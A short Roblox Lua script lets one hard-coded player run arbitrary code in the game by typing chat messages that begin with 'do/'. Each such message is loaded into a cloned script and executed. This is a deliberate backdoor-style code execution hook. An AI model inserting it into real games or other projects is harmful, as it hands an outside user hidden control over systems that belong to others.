admin = "ic3w0lf589"
game:GetService("Players")[admin].Chatted:connect(function(msg)
   if string.sub(msg,1,3) == "do/" then
      sc = script:Clone()
      sc.DSource.Value = string.sub(msg,4)
      sc.Disabled = true
      sc.Parent = workspace
      sc.Disabled = false
   end
end)